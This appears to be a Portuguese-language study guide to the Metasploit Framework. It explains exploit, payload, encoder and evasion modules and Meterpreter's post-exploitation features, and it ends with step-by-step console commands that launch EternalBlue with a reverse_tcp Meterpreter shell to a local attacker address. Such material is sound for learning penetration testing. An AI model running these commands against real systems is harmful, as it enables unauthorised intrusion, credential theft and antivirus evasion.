# Metasploit framework

O **Metasploit Framework (MSF)** é uma **plataforma de código aberto** usada para:
* **Desenvolver**
* **Testar**
* **Executar**
**explorações (exploits) de vulnerabilidades** em sistemas e aplicações. Resumindo é um kit completo para exploração de vulnerabilidades, e um dos principais **frameworks de pentest e ethical hacking** do mundo.

### Módulos principais

São scripts em Ruby que interagem com o próprio Metasploit para executar alguma tarefa específica. 

#### 1 - **Exploits**

Ele não é a “carga” em si (isso é o **payload**), nem a “maquiagem” (**encoder**), mas sim a **ferramenta que abre a brecha** explorando uma vulnerabilidade para permitir a execução do payload.

Responsável por:
1. **Aproveitar uma vulnerabilidade** em um software, serviço ou sistema operacional.
2. **Entregar o payload** escolhido pelo pentester.
   * O exploit cria a “porta de entrada” e injeta o **payload** (que pode ser um reverse shell, meterpreter, criação de usuário, etc.).
3. **Executar a carga maliciosa** na máquina alvo.
   * Se o exploit funcionar, o payload será executado com os privilégios do processo atacado (às vezes até administrador/root).

Cada exploit do Metasploit é um script Ruby que inclui:
* **Informações da vulnerabilidade** (CVE, autor, plataforma afetada, referência técnica).
* **Método de exploração** (como acionar a falha).
* **Alvos suportados** (versões de SO, serviços, arquiteturas).
* **Compatibilidade com payloads** (quais tipos podem ser entregues).

#### 2 - **Payloads**

O **payload** é a **carga útil** que será executada **depois que o exploit consegue explorar a vulnerabilidade**. 

Funciona em conjunto com o **exploit**: sem exploit, o payload não entra; sem payload, o exploit não serve para nada.

Em outras palavras:
* O **exploit** abre a porta (usa a falha).
* O **payload** é o que passa por essa porta (o código que o atacante realmente quer rodar).

**Tipos de Payloads:**
1. **Singles**
   * Contêm todo o código em um único módulo.
   * Exemplo: abrir um shell simples.
   * Rápidos e diretos, mas limitados.
2. **Stagers**
   * Pequenos payloads iniciais que **preparam o terreno** (criam a conexão com o atacante).
   * Servem para carregar payloads maiores.
   * Exemplo: `reverse_tcp` que só abre a conexão.
3. **Stages**
   * São os payloads maiores que vêm depois do *stager*.
   * Exemplo: `meterpreter`, que oferece uma shell interativa completa com funções extras.

#### 3 - **Auxiliary**

Serve para executar **funções auxiliares** que **não envolvem exploração direta** de vulnerabilidades.

Usado principalmente para:
1. **Reconhecimento e varredura (scanning)**
2. **Enumeração de serviços e usuários**
3. **Força bruta (bruteforce)**
4. **Fuzzing** (testar entradas inválidas para achar falhas)
5. **Negação de serviço (DoS)**
6. Outras ações de suporte que ajudam antes ou depois de explorar.

#### 4 - *Post**

O módulo **post** (ou pós-exploitation) é usado **após obter acesso ao sistema alvo**. Serve para **coletar informações, manter persistência e expandir privilégios ou movimento lateral**. Só funciona **quando já existe uma sessão ativa** (shell ou meterpreter) no alvo.

**O que dá para fazer com módulos post?**

1. **Coleta de informações (gathering)**
2. **Escalada de privilégios (privilege escalation)**
   * Tentar virar administrador/root no sistema comprometido.
3. **Movimentação lateral**
   * Usar credenciais coletadas para invadir outras máquinas na rede.
4. **Persistência**
   * Instalar backdoors para manter acesso mesmo após reboot.
5. **Exfiltração**
   * Copiar arquivos, capturar teclas (*keylogger*), tirar screenshots.

#### 5 - *Encoders**

Módulo que **transforma o payload** (o código que será executado na máquina alvo) para que ele:

1. **Evite detecção por antivírus (AV), IDS/IPS e EDR**
   * Antivírus geralmente trabalham com *assinaturas conhecidas*.
   * O encoder muda a “cara” do payload sem mudar sua função.
2. **Evite caracteres inválidos**
   * Em certos exploits, não é possível enviar alguns caracteres (exemplo: `\x00` ou `\x0a`).
   * O encoder reescreve o payload para que funcione sem esses bytes proibidos.
3. **Obfuscação**
   * Serve para deixar o payload menos legível, dificultando análise estática.

**Funcionamento:**
* O payload é **codificado** com um algoritmo de transformação (ex: XOR, base64-like, etc.).
* Um **stub de decodificação** é incluído junto.
* Quando o payload roda na vítima, o stub **decodifica** o shellcode de volta à forma original e o executa.

**Limitações:**
* Encoders **não garantem bypass 100%** de antivírus modernos (que usam heurística e comportamento).
* Em ambientes atuais, ferramentas de defesa conseguem detectar mesmo payloads encodados.
* Hoje, usam-se técnicas mais avançadas de **evasion** (outro módulo do Metasploit, bem mais poderoso que encoder).

#### 6 - **Evasion**

Usado para **criar cargas maliciosas (payloads) modificadas**, capazes de:
1. **Driblar antivírus (AV)**
2. **Evitar detecção por IDS/IPS/EDR**
3. **Disfarçar a execução do exploit/payload**

👉 Ele é mais avançado que o **encoder** (que só muda a forma do payload). Enquanto o encoder faz “obfuscação simples”, o **evasion** aplica **técnicas ativas de bypass de segurança**.

**Técnicas comuns de evasão:**
* **Polimorfismo** → muda constantemente a aparência do código.
* **Ofuscação de código** → insere lixo/instruções inúteis para confundir assinaturas.
* **Packing** → comprime e embaralha o payload.
* **Uso de APIs legítimas** → para misturar o malicioso com funções comuns do sistema.
* **Execução em memória** → evita gravar arquivos suspeitos em disco.

**Diferença entre encoder e evasion**

| Característica    | Encoder 🎭                      | Evasion 🕵️                                |
| ----------------- | ------------------------------- | ------------------------------------------ |
| Objetivo          | Obfuscar payload (mudar “cara”) | Bypassar ativamente AV/EDR                 |
| Nível de proteção | Simples (assinaturas)           | Mais avançado (heurística e comportamento) |
| Exemplo clássico  | `x86/shikata_ga_nai`            | `windows/windows_defender_exe`             |

#### 6 - **Nops**

O módulo **nop** gera instruções chamadas de **No Operation** (NOPs). Elas **não executam nenhuma ação útil** no processador além de “não fazer nada” e seguir para a próxima instrução.

No contexto de exploração, NOPs são usados para:
  1. **Preencher espaço** em um shellcode.
  2. **Criar NOP sleds**, que aumentam a chance de o exploit “cair” corretamente no payload.

👉 Resumindo: o módulo **nop** é como um **“colchão de instruções vazias”** para facilitar a execução do payload.

Em ataques como **buffer overflow**, o atacante precisa acertar o **endereço de memória exato** onde o payload foi injetado.
* Se errar por alguns bytes → falha.
* Se houver um **NOP sled** (sequência de NOPs antes do payload), qualquer salto que cair em qualquer ponto do sled **escorregará até o shellcode**.

O módulo **nop** do Metasploit é usado para **gerar instruções NOP (No Operation)** que servem de **colchão de segurança em ataques de buffer overflow**, ajudando o payload a ser executado corretamente mesmo quando o endereço exato não é atingido.

### Meterpreter

O **Meterpreter** é um **payload avançado** do Metasploit Framework.
* Fornece ao atacante uma **shell interativa**, carregada inteiramente **na memória** (sem gravar nada em disco, o que ajuda a evitar antivírus).
* Diferente de um shell simples, o Meterpreter tem **diversos comandos extras** para pós-exploração.
👉 Em resumo: o Meterpreter é **o “canivete suíço” do pentester dentro da máquina comprometida**.

**Características principais:**

1. **Carregado em memória** → não deixa rastros no disco.
2. **Modular** → você pode carregar/extender funções conforme necessário.
3. **Comunicação criptografada** → dificulta detecção.
4. **Invisibilidade** → roda como parte de um processo existente da vítima.

**O que dá para fazer com Meterpreter:**

* **Controle remoto da máquina**:
  * Executar comandos do sistema.
  * Explorar o sistema de arquivos (upload/download).
* **Coleta de informações**:
  * Hashdump (pegar senhas).
  * Informações de rede e processos.
* **Monitoramento**:
  * Keylogger.
  * Captura de tela (*screenshot*).
  * Webcam snap (foto pela câmera).
* **Movimentação lateral**:
  * Pivoting (usar a máquina comprometida como ponte para atacar outras).
* **Persistência**:
  * Criar backdoors para manter acesso.

### Comando básicos

Comando linux para abrir o console do metasploit-frameworl:

`$ msfconsole`

**1. Comando Linus**
* O console permite executar comandos linux

**2. Navegação e busca**
* `search {termo}` → procurar exploits, payloads, auxiliary etc.

  ```
  msf6 > show nops

  NOP Generators
  ==============

   #   Name                  Disclosure Date  Rank    Check  Description
   -   ----                  ---------------  ----    -----  -----------
   0   nop/aarch64/simple    .                normal  No     Simple
   1   nop/armle/simple      .                normal  No     Simple
   2   nop/cmd/generic       .                normal  No     Generic Command Nop Generator
   3   nop/mipsbe/better     .                normal  No     Better
   4   nop/php/generic       .                normal  No     PHP Nop Generator
   5   nop/ppc/simple        .                normal  No     Simple
   6   nop/riscv32le/simple  .                normal  No     Simple
   7   nop/riscv64le/simple  .                normal  No     Simple
   8   nop/sparc/random      .                normal  No     SPARC NOP Generator
   9   nop/tty/generic       .                normal  No     TTY Nop Generator
   10  nop/x64/simple        .                normal  No     Simple
   11  nop/x86/opty2         .                normal  No     Opty2
   12  nop/x86/single_byte   .                normal  No     Single Byte
  ```
  ```
  msf6 > search  nop/aarch64/simple  

  Matching Modules
  ================

   #  Name                Disclosure Date  Rank    Check  Description
   -  ----                ---------------  ----    -----  -----------
   0  nop/aarch64/simple  .                normal  No     Simple
  ```
* `info` → mostra informações detalhadas sobre um módulo.

   ```
  msf6 > info nop/aarch64/simple 

       Name: Simple
     Module: nop/aarch64/simple
   Platform: All
       Arch: aarch64
       Rank: Normal

  Provided by:
    timwr

  Description:
    Simple NOP generator
  ```
  
**3. Seleção de módulos**
* `use <módulo>` → carrega um módulo.

  ```
  msf6 > use exploit/windows/smb/ms17_010_eternalblue
  [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
  msf6 exploit(windows/smb/ms17_010_eternalblue) > 
  ```
* `back` → volta ao contexto anterior (sai do módulo).
* `show options` → lista opções configuráveis do módulo selecionado.
* `show payloads` → mostra payloads compatíveis com o exploit.
* `show targets` → lista os sistemas-alvo suportados.

**4. Configuração**
* `set <opção> <valor>` → define valores.

  ```
  set RHOSTS 192.168.1.100
  set PAYLOAD windows/meterpreter/reverse_tcp
  ```
* `setg <opção> <valor>` → define opções globais (valem para todos os módulos).

  ```
  setg LHOST 192.168.1.50
  ```
* `unset <opção>` → remove configuração.
  
**5. Execução**
* `exploit` ou `run` → executa o módulo selecionado.
  
  ```
  exploit
  ```
* `exploit -j` → roda em segundo plano como job.
* `exploit -z` → executa sem interagir com sessão aberta.

**6. Sessões**

* `sessions` → lista sessões ativas (ex.: meterpreter, shells).
* `sessions -i <id>` → interage com sessão específica.
  
  ```
  sessions -i 1
  ```
* `sessions -k <id>` → encerra uma sessão.

**7. Outros úteis**

* `jobs` → lista jobs rodando em background.
* `jobs -k <id>` → mata um job.
* `history` → histórico de comandos.
* `help` → mostra ajuda.
* `banner` → muda a arte ASCII da inicialização 😁.

### Fluxo típico de uso

1. **Buscar módulo:**
   ```
   search ms17_010
   ```
2. **Carregar exploit:**
   ```
   use exploit/windows/smb/ms17_010_eternalblue
   ```
3. **Ver opções e payloads:**
   ```
   show options
   show payloads
   ```
4. **Configurar parâmetros:**
   ```
   set RHOSTS 192.168.1.100
   set LHOST 192.168.1.50
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   ```
5. **Executar ataque:**
   ```
   exploit
   ```
6. **Gerenciar sessões:**
   ```
   sessions -i 1
   ```
